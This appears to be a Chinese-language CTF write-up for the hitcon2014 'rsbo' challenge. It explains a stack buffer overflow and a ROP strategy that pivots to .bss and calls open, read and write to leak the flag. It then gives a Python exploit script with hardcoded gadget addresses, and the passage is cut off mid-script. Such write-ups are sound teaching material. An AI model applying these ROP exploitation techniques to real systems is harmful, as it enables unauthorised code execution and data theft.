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" alt>  eip之后还有16bytes可用，考虑到栈不可执行，所以使用ROP方式，依次调用open，read，write来打开读取flag再写出，flag的路径在init函数中已经有了。 这边有两种思路，第一种就利用之后的16byte，因为空间很小，所以一次就调用一个函数，先调用open，之后ret回main。再次输入再次溢出时调用read，之后再次返回main，溢出后调用write 第二种就是先调用read或者read_80_bytes读入到.bss，之后ebp指向.bss进入ROP链 我是使用第二种，exp如下（没有网络通信部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7 </span></span><br><span class="line">\<span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">hitcon2014</span></span><br><span class="line"><span class="string">rsbo</span></span><br><span class="line"><span class="string">exp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    junk = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x00000000</span>)  * <span class="number">26</span></span><br><span class="line">    bss = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804a040</span>)</span><br><span class="line">    read\_80\_byte = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804865c</span>)</span><br><span class="line">    leave_ret = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804867d</span>)</span><br><span class="line">    opep_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048420</span>)</span><br><span class="line">    read_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x080483e0</span>)</span><br><span class="line">    write_pid = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x08048450</span>)</span><br><span class="line">    pppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879d</span>)</span><br><span class="line">    ppr = struct.pack(<span class="string">'&lt;I'</span>, <span class="number">0x0804879e</span>)</span><br><span class="line">    buf = struct.pack(<span class="string">'&lt;I'</span>, <span 